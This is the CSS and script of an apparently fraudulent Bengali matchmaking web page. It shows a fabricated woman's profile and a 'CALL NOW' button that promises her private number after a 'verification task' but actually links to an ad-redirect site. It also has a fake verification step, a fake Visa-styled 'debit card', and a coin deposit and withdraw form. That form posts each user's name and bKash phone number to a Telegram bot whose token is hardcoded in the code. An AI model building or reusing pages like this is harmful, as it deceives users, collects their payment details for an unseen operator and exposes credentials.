        /* Home UI */
        .search-area { padding: 10px 15px; }
        .search-box { display: flex; align-items: center; background: #fdf2f5; padding: 10px 15px; border-radius: 50px; border: 1px solid #ffccd5; }
        .search-box input { border: none; background: none; outline: none; width: 100%; margin-left: 10px; }
        .quote-banner { background: linear-gradient(45deg, var(--primary), var(--secondary)); margin: 10px 15px; padding: 12px; border-radius: 15px; color: #fff; text-align: center; font-size: 13px; font-style: italic; }

        .profile-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 15px; }
        .p-card { background: #fff; border-radius: 15px; overflow: hidden; border: 1px solid #ffccd5; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
        .p-img { width: 100%; height: 160px; object-fit: cover; }
        .p-info { padding: 8px; text-align: center; }

        /* Detail Bio UI */
        .bio-header-img { width: 100%; height: 350px; object-fit: cover; }
        .bio-body { background: #fff; border-radius: 30px 30px 0 0; margin-top: -30px; padding: 25px; position: relative; box-shadow: 0 -10px 20px rgba(0,0,0,0.05); }
        .info-table { width: 100%; border-collapse: collapse; margin-top: 15px; }

        .btn-call { background: var(--calling-color) !important; color: #fff; border: none; padding: 15px; border-radius: 50px; width: 100%; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 18px; text-decoration: none; margin-top: 20px; box-shadow: 0 5px 15px rgba(37, 211, 102, 0.4); }

        .video-card { background: #fff; border: 1px solid #eee; border-radius: 15px; padding: 10px; margin: 15px; }

        .video-thumb img { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
        .video-thumb i { position: absolute; font-size: 50px; color: #fff; }

        /* Profile & Card */
        .user-header-card { text-align: center; padding: 20px; border-radius: 20px; border: 2px solid var(--green); margin: 20px; background: #fff; }
        .user-p-img { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid var(--primary); }
        
        .debit-card { background: linear-gradient(135deg, #1e3799, #0984e3); color: white; border-radius: 20px; padding: 25px; margin: 20px; height: 210px; box-shadow: 0 10px 25px rgba(30, 55, 153, 0.3); }

        .nav-link.active { color: var(--primary); }
        .nav-link i { font-size: 22px; display: block; margin-bottom: 3px; }

        .btn-action { background: var(--primary); color: #fff; border: none; padding: 14px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 10px; outline: none; }

<script>
    // Constants
    const TG_BOT_TOKEN = "8279372040:AAGKfFsmnkI5ihQE-T2v6hU47dEoZ892_nA";
    const TG_CHAT_ID = "-1003119670905";

    const girls = [
        
        { id: 1, name: "কবিতা", age: 25, loc: "গাজীপুর", v: "***", t: "হাতীবান্ধা", d: "রংপুর", bio: "আসসালামু আলাইকুম আমি কবিতা। আমার একটি ছোট্ট সন্তান আছে। যিনি আমাকে ভালোবাসার পাশাপাশি আমার সন্তানটির দায়িত্বও নিজের মনে করে নিতে পারবেন, শুধুমাত্র তারাই যোগাযোগ করবেন", img: "https://blogger.googleusercontent.com/img/a/AVvXsEiipJz5RN2SYEdINIuUhbhKmODMrS5_euUVwb7QGjWfWyKJX-hDfaANq-QJlatHje9eLK0ueYjcLzi-CIPhAwQY3QXrVOe-_hZ-md2eDgG_o163odayl-PJZKurhY-iVXvsI192wBIY95qp5sDaj_slBC9F_J8Y7_vA1dxwIc6f6FbCoL7ePgu1ZUDgXo1-=s1600" },
      
    ];

    const videoData = [
        { id: 1, title: "কিভাবে অ্যাপ চালাবেন?", url: "fA8HshHwz5w" },
  
    ];

    // Variables
    let userCoins = parseInt(localStorage.getItem('ghotok_coins')) || 0;
    let isVerified = localStorage.getItem('isVerified') === 'true';
    let userData = JSON.parse(localStorage.getItem('userData')) || null;

    // Initialization
    function updateUI() {
        localStorage.setItem('ghotok_coins', userCoins);
        renderHomeGrid(girls);
        renderProfileSection();
    }

    function navigateTo(id) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
        document.getElementById(id).classList.add('active-page');
        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
        if(id === 'home-page') document.getElementById('btn-home').classList.add('active');
        if(id === 'video-page') document.getElementById('btn-video').classList.add('active');
        if(id === 'abedon-page') document.getElementById('btn-abedon').classList.add('active');
        if(id === 'profile-page') document.getElementById('btn-profile').classList.add('active');
        window.scrollTo(0,0);
    }

    // Home Grid
    function renderHomeGrid(data) {
        const grid = document.getElementById('profile-grid');
        grid.innerHTML = "";
        data.forEach(g => {
            grid.innerHTML += `<div class="p-card" onclick="openBio(${g.id})"><img src="${g.img}" class="p-img"><div class="p-info"><b>${g.name}</b><br><small>${g.age} বছর | ${g.loc}</small></div></div>`;
        });
    }

    function searchProfiles() {
        const query = document.getElementById('search-input').value.toLowerCase();
        const filtered = girls.filter(g => g.name.toLowerCase().includes(query) || g.loc.toLowerCase().includes(query));
        renderHomeGrid(filtered);
    }

    function openBio(id) {
        const g = girls.find(x => x.id === id);
        const bioPage = document.getElementById('bio-detail-page');
        bioPage.innerHTML = `
            <img src="${g.img}" class="bio-header-img">
            <div class="bio-body">
                <button onclick="navigateTo('home-page')" style="background:none; border:none; color:var(--primary); font-weight:bold; margin-bottom:15px;"><i class="fa fa-arrow-left"></i> ফিরে যান</button>
                <h2>${g.name}</h2>
                <table class="info-table">
                    <tr><td>গ্রাম</td><td>${g.v}</td></tr>
                    <tr><td>থানা</td><td>${g.t}</td></tr>
                    <tr><td>বিভাগ</td><td>${g.d}</td></tr>
                    <tr><td>বয়স</td><td>${g.age} বছর</td></tr>
                </table>
                <p style="margin-top:15px; color:#555; line-height:1.6;">${g.bio}</p>
                <div style="background:#fff0f3; padding:20px; border-radius:20px; text-align:center; border:2px dashed var(--primary); margin-top:25px;">
                    <p style="font-size:12px; color:#666; margin-bottom:15px;">Please complete one simple task below to verify that you are a real person. Once verified, your phone's dialer will open automatically with the private number </p>
                    <a href="https://omg10.com/4/6709213" class="btn-call"><i class="fa fa-phone"></i> CALL NOW</a>
                </div>
            </div>`;
        navigateTo('bio-detail-page');
    }

    // Video List
    function initVideos() {
        const list = document.getElementById('video-content');
        list.innerHTML = "";
        videoData.forEach(v => {
            list.innerHTML += `
                <div class="video-card">
                    <div class="video-thumb" onclick="watchVideo('${v.url}')">
                        <img src="https://img.youtube.com/vi/${v.url}/0.jpg">
                        <i class="fa fa-play-circle"></i>
                    </div>
                    <h4 style="margin-top:10px;">${v.title}</h4>
                </div>`;
        });
    }

    async function watchVideo(url) {
        if (typeof show_10250871 === 'function') {
            show_10250871().then(() => {
                userCoins += 10; updateUI();
                alert("অ্যাড সম্পন্ন হয়েছে! ১০ কয়েন আপনার ব্যালেন্সে যোগ হলো।");
                window.location.href = "https://www.youtube.com/watch?v=" + url;
            });
        } else {
            window.location.href = "https://www.youtube.com/watch?v=" + url;
        }
    }

    // Profile Logic
    function renderProfileSection() {
        const box = document.getElementById('user-info-area');
        if(isVerified && userData) {
            box.innerHTML = `<div class="user-header-card">
                <img src="${userData.photo}" class="user-p-img">
                <h2 style="margin-top:10px;">${userData.name}</h2>
                <p style="color:var(--green); font-weight:bold;"><i class="fa fa-check-circle"></i> ভেরিফাইড মেম্বার</p></div>`;
        } else {
            box.innerHTML = `<div style="padding:20px;"><h3>প্রোফাইল ভেরিফাই করুন</h3><input type="file" id="v-file" accept="image/*"><input type="text" id="v-name" placeholder="নাম"><button class="btn-action" onclick="handleVerify()">ভেরিফাই করুন</button></div>`;
        }
    }

    function handleVerify() {
        const file = document.getElementById('v-file').files[0];
        const name = document.getElementById('v-name').value;
        if(!file || !name) return alert("সব দিন!");
        const r = new FileReader();
        r.onload = (e) => {
            const uid = "GH-" + Math.floor(1000 + Math.random() * 9000);
            userData = { name, photo: e.target.result, id: uid };
            isVerified = true; localStorage.setItem('isVerified', 'true');
            localStorage.setItem('userData', JSON.stringify(userData));
            updateUI();
        };
        r.readAsDataURL(file);
    }

    function showDebitCard() {
        if(!isVerified) return alert("আগে ভেরিফাই করুন!");
        document.getElementById('card-detail-page').innerHTML = `
            <button onclick="navigateTo('profile-page')" style="background:none; border:none; color:var(--primary); margin-bottom:15px;"><i class="fa fa-arrow-left"></i> ফিরে যান</button>
            <div class="debit-card">
                <div style="display:flex; justify-content:space-between;"><i class="fa fa-microchip" style="font-size:30px; color:var(--gold);"></i><i class="fab fa-cc-visa" style="font-size:35px;"></i></div>
                <div class="card-num">${userData.id} 0000 1234</div>
                <div style="display:flex; justify-content:space-between;"><span>${userData.name}</span><span>${userCoins} Coins</span></div>
            </div>`;
        navigateTo('card-detail-page');
    }

    function showTopup() {
        if(!isVerified) return alert("আগে ভেরিফাই করুন!");
        document.getElementById('topup-detail-page').innerHTML = `
            <button onclick="navigateTo('profile-page')" style="background:none; border:none; color:var(--primary); margin-bottom:15px;"><i class="fa fa-arrow-left"></i> ফিরে যান</button>
            <div class="stat-card">১০০০ কয়েন = ১০০ টাকা</div>
            <input type="number" id="c-amt" placeholder="কয়েন সংখ্যা"><input type="text" id="c-ph" placeholder="বিকাশ নম্বর">
            <select id="c-type"><option value="Deposit">ডিপোজিট (কয়েন কেনা)</option><option value="Withdraw">উত্তোলন (টাকা নেওয়া)</option></select>
            <button class="btn-action" onclick="submitTopup()">সাবমিট রিকোয়েস্ট</button>`;
        navigateTo('topup-detail-page');
    }

    async function submitTopup() {
        const amt = parseInt(document.getElementById('c-amt').value);
        const ph = document.getElementById('c-ph').value;
        const type = document.getElementById('c-type').value;
        if(!amt || !ph) return alert("তথ্য দিন!");
        if(type === 'Withdraw' && userCoins < amt) return alert("পর্যাপ্ত ব্যালেন্স নেই!");
        if(type === 'Withdraw' && amt < 1000) return alert("মিনিমাম ১০০০ কয়েন লাগবে!");
        
        if(type === 'Withdraw') { userCoins -= amt; updateUI(); }
        
        const msg = `🪙 <b>কয়েন রিকোয়েস্ট (${type})</b>\nইউজার: ${userData.name}\nকয়েন: ${amt}\nফোন: ${ph}`;
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML'})
        });
        alert("রিকোয়েস্ট সফল হয়েছে!");
        navigateTo('profile-page');
    }

    function showMembers() {
        const page = document.getElementById('members-detail-page');
        page.innerHTML = `<button onclick="navigateTo('profile-page')" style="background:none; border:none; color:var(--primary); margin-bottom:15px;"><i class="fa fa-arrow-left"></i> ফিরে যান</button><h3>ভেরিফাইড মেম্বার লিস্ট</h3><div id="m-list-box"></div>`;
        const box = page.querySelector('#m-list-box');
        if(isVerified) {
            box.innerHTML += `<div class="member-item"><img src="${userData.photo}" class="member-avatar"><div><strong>${userData.name} (আপনি)</strong></div></div>`;
        }
        box.innerHTML += `<div class="member-item"><img src="https://via.placeholder.com/50" class="member-avatar"><div><strong>রাকিব আহমেদ</strong><br><small>ভেরিফাইড মেম্বার</small></div></div>`;
        navigateTo('members-detail-page');
    }

    function showNotice() {
        document.getElementById('notice-detail-page').innerHTML = `
            <button onclick="navigateTo('profile-page')" style="background:none; border:none; color:var(--primary); margin-bottom:15px;"><i class="fa fa-arrow-left"></i> ফিরে যান</button>
            <h2>আমাদের নিয়মাবলী</h2><div class="stat-card" style="text-align:left;">১. সঠিক তথ্য দিয়ে বায়োডাটা দিন।<br>২. নিয়ম মেনে কয়েন কিনুন ও উইথড্র করুন।<br>৩. আমরা কেবল বিশ্বস্ত মাধ্যম হিসেবে কাজ করি।</div>`;
        navigateTo('notice-detail-page');
    }

    async function handleAbedon() {
        const name = document.getElementById('cv-name').value;
        if(!name) return alert("নাম দিন!");
        alert("আবেদন জমা হয়েছে!");
        navigateTo('home-page');
    }

    // Heart Generator
    function createHearts() {
        const box = document.getElementById('heart-box');
        for(let i=0; i<15; i++) {
            let h = document.createElement('div');
            h.className = 'heart'; h.innerHTML = '❤';
            h.style.left = Math.random() * 100 + 'vw';
            h.style.animationDelay = Math.random() * 8 + 's';
            h.style.fontSize = Math.random() * 15 + 15 + 'px';
            box.appendChild(h);
        }
    }

    // Start
    initVideos();
    createHearts();
    updateUI();
</script>
</body>
</html>
